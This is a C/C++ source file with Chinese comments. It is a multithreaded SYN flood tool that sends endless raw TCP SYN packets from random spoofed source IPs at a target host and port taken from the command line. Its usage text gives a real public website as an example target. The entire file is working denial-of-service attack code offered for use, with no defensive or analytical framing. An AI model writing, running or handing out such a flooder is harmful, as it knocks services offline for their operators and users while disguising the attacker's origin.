#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h>
#include <arpa/inet.h>
#include <pthread.h>

#define ERROR(INFO)   \
    {                 \
        perror(INFO); \
        exit(1);      \
    }

/**
 * IP头部
 */
struct IPHeader
{
    unsigned char header_len;      // 头部长度
    unsigned char tos;             // 服务类型
    unsigned short total_len;      // 包总长度
    unsigned short id;             // 标识符，在分段时使用
    unsigned short frag_and_flags; // 13位偏移以及3位标志位
    unsigned char ttl;             // time-to-live
    unsigned char proto;           // 上层协议
    unsigned short checksum;       // 校验和
    unsigned int src_ip;           // 源IP
    unsigned int dst_ip;           // 目标IP
};

/**
 * TCP头部
 */
struct TCPHeader
{
    unsigned short src_port;       // 源端口
    unsigned short dst_port;       // 目的端口
    unsigned int seq;              // 序列号
    unsigned int ack;              // 确认号
    unsigned char data_reserve;    // 数据偏移量，以4字节为单位；以及保留位
    unsigned char flag;            // 6位的标志位，这里要设置SYN位为1
    unsigned short win_size;       // 窗口大小
    unsigned short checksum;       // 校验和
    unsigned short urgent_pointer; // 紧急指针
};
/**
 * TCP伪首部，用于计算校验和
 */
struct TCPPseudoHeader
{
    unsigned int src_addr;
    unsigned int dst_addr;
    char zero;
    char protocol;
    unsigned short length;
};

/**
 * 生成校验和
 */
u_short checksum(unsigned short *buffer, unsigned short size);

/**
 * 处理Ctrl+C传来的SIGINT信号
 * 关闭套接字和释放资源
 */
void handle_SIGINT(int sig);
/**
 * 初始化ip、tcp以及tcp伪头部
 */
void init_iphdr(IPHeader *iphdr, uint32_t src_ip, uint32_t dst_ip);
void init_tcphdr(TCPHeader *tcphdr, u_short dst_port);
void init_psdtcphdr(TCPPseudoHeader *psdtcphdr, uint32_t src_ip, uint32_t dst_ip);

/**
 * 线程参数
 */
struct ThreadArgs
{
    unsigned int thread_id;
    sockaddr_in dst_addr; // 攻击地址
    int sockfd;           // 线程攻击使用的套接字
};

void *thread_func(void *arg);

int thread_count;
ThreadArgs *thread_args; // 子线程参数
pthread_t *threads;      // 子线程数组

/**
 * 处理Ctrl+C传来的SIGINT信号
 * 关闭套接字和释放资源
 */
void handle_SIGINT(int sig);

/**
 * 创建raw套接字并设置为非阻塞
 */
int make_non_block_raw_socket();

int main(int argc, char **argv)
{
    if (argc < 3)
    {
        printf("Usage: sudo ./syn <destination IP> <destination Port> [<thread count> = 4]\n");
        printf("E.g.\n");
        printf("    sudo ./syn 192.168.247.176 8080\n");
        printf("    sudo ./syn www.baidu.com 80 8\n");
        exit(0);
    }

    srand(time(NULL));

    /**
     * 初始化攻击地址
     */
    char dst_ip[INET_ADDRSTRLEN + 1];
    unsigned short dst_port = 0;
    sockaddr_in dst_addr;

    strncpy(dst_ip, argv[1], INET_ADDRSTRLEN);
    dst_port = (unsigned short)strtol(argv[2], NULL, 10);
    if (argc > 3)
        thread_count = strtol(argv[3], NULL, 10);
    else
        thread_count = 4;

    bzero(&dst_addr, sizeof(sockaddr_in));
    dst_addr.sin_family = AF_INET;
    dst_addr.sin_port = htons(dst_port);

    // 如果用户指定的IP是域名的形式，则需要先通过DNS查询到IP地址
    if (inet_addr(dst_ip) == INADDR_NONE)
    {
        hostent *host = gethostbyname(argv[1]);
        if (host == NULL)
            ERROR("gethostbyname()");
        dst_addr.sin_addr = *((in_addr *)(host->h_addr_list[0]));
        strncpy(dst_ip, inet_ntoa(dst_addr.sin_addr), INET_ADDRSTRLEN);
    }
    else
        dst_addr.sin_addr.s_addr = inet_addr(dst_ip);

    if (dst_port < 0 || dst_port > 65535)
    {
        printf("Invalid Port\n");
        exit(1);
    }

    printf("Attack Address: %s:%d\n", dst_ip, dst_port);

    /**
     * 下面初始化线程参数以及创建线程
     * 开启thread_count个线程进行syn攻击
     */
    thread_args = new ThreadArgs[thread_count];
    threads = new pthread_t[thread_count];
    int i;
    for (i = 0; i < thread_count; i++)
    {
        // thread_args[i].dst_addr = dst_addr;
        memcpy(&thread_args[i].dst_addr, &dst_addr, sizeof(sockaddr_in));
        thread_args[i].sockfd = make_non_block_raw_socket();
        thread_args[i].thread_id = i;
    }

    threads = new pthread_t[thread_count];
    for (i = 0; i < thread_count; i++)
        pthread_create(&threads[i], NULL, thread_func, &thread_args[i]);

    /**
     * 处理SIGINT信号，使得用户结束程序时套接字能够被关闭
     */
    signal(SIGINT, handle_SIGINT);
    
    // sigset_t sig_set;
    // int sig;
    // sigemptyset(&sig_set);
    // sigaddset(&sig_set, SIGINT);
    // sigwait(&sig_set, &sig); // 在接收到Ctrl+C动作传过来的信号后清除套接字
    sleep(24 * 60 * 60);
    return 0;
}

unsigned short
checksum(unsigned short *buffer, unsigned short size)
{
    unsigned long cksum = 0;

    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(unsigned short);
    }

    if (size)
    {
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return (unsigned short)(~cksum);
}

void init_iphdr(IPHeader *iphdr, uint32_t src_ip, uint32_t dst_ip)
{
    iphdr->header_len = (4 << 4 | sizeof(IPHeader) / sizeof(unsigned int));
    iphdr->tos = 0;
    iphdr->total_len = htons(sizeof(IPHeader) + sizeof(TCPHeader));
    iphdr->id = 1;
    iphdr->frag_and_flags = 0x40;
    iphdr->ttl = 255;
    iphdr->proto = IPPROTO_TCP;
    iphdr->checksum = 0;
    iphdr->src_ip = src_ip;
    iphdr->dst_ip = dst_ip;
}
void init_tcphdr(TCPHeader *tcphdr, u_short dst_port)
{
    tcphdr->src_port = htons(rand() % 16383 + 49152);
    tcphdr->dst_port = htons(dst_port);
    tcphdr->seq = htonl(rand() % 90000000 + 2345);
    tcphdr->ack = 0;
    tcphdr->data_reserve = (sizeof(TCPHeader) / 4 << 4 | 0);
    tcphdr->flag = 0x02;
    tcphdr->win_size = htons(1024);
    tcphdr->checksum = 0;
    tcphdr->urgent_pointer = 0;
}
void init_psdtcphdr(TCPPseudoHeader *psdtcphdr, uint32_t src_ip, uint32_t dst_ip)
{
    psdtcphdr->zero = 0;
    psdtcphdr->protocol = IPPROTO_TCP;
    psdtcphdr->length = htons(sizeof(TCPHeader));
    psdtcphdr->src_addr = src_ip;
    psdtcphdr->dst_addr = dst_ip;
}

void handle_SIGINT(int sig)
{
    int i;
    for (i = 0; i < thread_count; i++)
        pthread_cancel(threads[i]);
    printf("\nwaiting sub-thread quit...\n");

    for (i = 0; i < thread_count; i++)
        pthread_join(threads[i], NULL);

    for (i = 0; i < thread_count; i++)
        close(thread_args[i].sockfd); // 关闭开启的套接字
    delete[] thread_args;
    delete[] threads;
    printf("attack stopped\n");
    exit(1);
}

int make_non_block_raw_socket()
{
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0)
        ERROR("socket()");
    int on = 1;
    /**
     * 设置该套接字的IP头部由用户自定义
     */
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
        ERROR("setsockopt()");

    /**
     * 设置该套接字为非阻塞，注意需要保留原本的flags
     */
    int flags;
    flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1)
        ERROR("fcntl()");
    if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) == -1)
        ERROR("fcntl()");

    return sockfd;
}

void *thread_func(void *arg)
{
    srand(pthread_self());

    // 设置子线程可以接收cancel，在接收到的时候延迟退出
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE, NULL);
    // pthread_setcanceltype(PTHREAD_CANCEL_DEFERRED, NULL);

    ThreadArgs *targs = (ThreadArgs *)arg;

    IPHeader iphdr;
    TCPHeader tcphdr;
    TCPPseudoHeader psdtcphdr;

    // 发送包缓冲区，以及用于计算校验和等功能的缓冲区
    char send_buf[128], buf[128];
    int ret; // 接收函数返回值并判断是否执行成功

    while (true)
    {
        // 主线程接收到SIGINT消息后对买个线程调用pthread_cancel
        pthread_testcancel();

        unsigned int src_ip = rand(); // 随机伪IP

        init_iphdr(&iphdr, src_ip, targs->dst_addr.sin_addr.s_addr);
        init_tcphdr(&tcphdr, ntohs(targs->dst_addr.sin_port));
        init_psdtcphdr(&psdtcphdr, src_ip, targs->dst_addr.sin_addr.s_addr);

        // 计算IP头部校验和
        memset(buf, 0, sizeof(buf));
        iphdr.checksum = checksum((u_short *)&iphdr, sizeof(iphdr));

        // 计算TCP头部校验和
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &psdtcphdr, sizeof(psdtcphdr));
        memcpy(buf + sizeof(psdtcphdr), &tcphdr, sizeof(tcphdr));
        tcphdr.checksum = checksum((u_short *)buf, sizeof(psdtcphdr) + sizeof(tcphdr));

        // 将IP头部和TCP头部添加到发送包前面
        memset(send_buf, 0, sizeof(send_buf));
        memcpy(send_buf, &iphdr, sizeof(iphdr));
        memcpy(send_buf + sizeof(iphdr), &tcphdr, sizeof(tcphdr));
        // 调用sendto发送
        ret = sendto(targs->sockfd, send_buf, sizeof(iphdr) + sizeof(tcphdr), 0, (sockaddr *)&targs->dst_addr, sizeof(sockaddr));

        // char src_ip[INET_ADDRSTRLEN + 1];
        // inet_ntop(AF_INET, &iphdr.src_ip, src_ip, INET_ADDRSTRLEN);
        // char dst_ip[INET_ADDRSTRLEN + 1];
        // inet_ntop(AF_INET, &targs->dst_addr.sin_addr, dst_ip, INET_ADDRSTRLEN);
        // printf("thread %d: from %s:%d to %s:%d\n", targs->thread_id, src_ip, ntohs(tcphdr.src_port), dst_ip, ntohs(targs->dst_addr.sin_port));

        if (ret < 0)
        {
            perror("sendto()");
            continue;
        }
    }
    pthread_exit(NULL);
}